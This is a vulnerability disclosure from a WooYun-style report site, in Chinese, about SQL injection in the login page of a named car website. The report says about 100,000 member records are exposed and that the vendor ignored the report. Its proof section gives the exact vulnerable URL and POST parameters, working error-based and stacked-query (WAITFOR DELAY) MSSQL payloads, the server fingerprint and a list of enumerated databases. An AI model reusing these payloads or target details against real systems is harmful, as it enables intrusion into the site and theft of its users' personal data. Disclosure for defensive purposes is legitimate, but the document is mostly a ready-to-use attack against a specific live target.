wybug_title: 爱意汽车网某处SQL注入导致十万会员数据测漏

wybug_detail:
漏洞详情 披露状态：   									2015-08-24：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-10-08：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 爱意汽车网某处SQL注入导致十万会员数据测漏 详细说明：  http://www.ieche.com/users/checklogin.asp  (POST)password=88952634&=88952634&name=88952634   漏洞证明：  
Place: POSTParameter:     Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: password=88952634' AND 1548=CONVERT(INT,(SELECT CHAR(113)+CHAR(115)+CHAR(99)+CHAR(116)+CHAR(113)+(SELECT (CASE WHEN (1548=1548) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(114)+CHAR(107)+CHAR(121)+CHAR(113))) AND 'IdlX'='IdlX&=88952634&name=88952634' AND 1548=CONVERT(INT,(SELECT CHAR(113)+CHAR(115)+CHAR(99)+CHAR(116)+CHAR(113)+(SELECT (CASE WHEN (1548=1548) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(114)+CHAR(107)+CHAR(121)+CHAR(113))) AND 'IdlX'='IdlX    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: password=88952634'; WAITFOR DELAY '0:0:5'--&=88952634&name=88952634'; WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008available databases [13]:[*] chengshi_bbs[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] uni_attack[*] uni_auto[*] uni_club[*] uni_sms[*] uni_tags[*] uni_users
